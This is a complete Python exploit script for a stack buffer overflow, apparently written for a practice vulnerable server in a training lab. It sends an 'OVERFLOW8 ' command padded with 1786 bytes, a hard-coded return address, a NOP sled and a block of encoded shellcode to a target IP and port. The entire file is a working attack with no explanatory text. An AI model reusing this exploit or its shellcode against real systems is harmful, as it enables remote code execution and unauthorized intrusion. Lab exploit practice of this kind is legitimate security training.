import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW8 '
buffer += b'A' * 1786
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xbd\xb5\x37\x5e\x5a\xdb\xca\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x31\x83\xc0\x04\x31\x68\x0f"
shellcode += b"\x03\x68\xba\xd5\xab\xa6\x2c\x9b\x54\x57\xac"
shellcode += b"\xfc\xdd\xb2\x9d\x3c\xb9\xb7\x8d\x8c\xc9\x9a"
shellcode += b"\x21\x66\x9f\x0e\xb2\x0a\x08\x20\x73\xa0\x6e"
shellcode += b"\x0f\x84\x99\x53\x0e\x06\xe0\x87\xf0\x37\x2b"
shellcode += b"\xda\xf1\x70\x56\x17\xa3\x29\x1c\x8a\x54\x5e"
shellcode += b"\x68\x17\xde\x2c\x7c\x1f\x03\xe4\x7f\x0e\x92"
shellcode += b"\x7f\x26\x90\x14\xac\x52\x99\x0e\xb1\x5f\x53"
shellcode += b"\xa4\x01\x2b\x62\x6c\x58\xd4\xc9\x51\x55\x27"
shellcode += b"\x13\x95\x51\xd8\x66\xef\xa2\x65\x71\x34\xd9"
shellcode += b"\xb1\xf4\xaf\x79\x31\xae\x0b\x78\x96\x29\xdf"
shellcode += b"\x76\x53\x3d\x87\x9a\x62\x92\xb3\xa6\xef\x15"
shellcode += b"\x14\x2f\xab\x31\xb0\x74\x6f\x5b\xe1\xd0\xde"
shellcode += b"\x64\xf1\xbb\xbf\xc0\x79\x51\xab\x78\x20\x3f"
shellcode += b"\x2a\x0e\x5e\x0d\x2c\x10\x61\x21\x45\x21\xea"
shellcode += b"\xae\x12\xbe\x39\x8b\xfd\x5c\xe8\xe1\x95\xf8"
shellcode += b"\x79\x48\xf8\xfa\x57\x8e\x05\x79\x52\x6e\xf2"
shellcode += b"\x61\x17\x6b\xbe\x25\xcb\x01\xaf\xc3\xeb\xb6"
shellcode += b"\xd0\xc1\x8f\x59\x43\x89\x61\xfc\xe3\x28\x7e"






payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
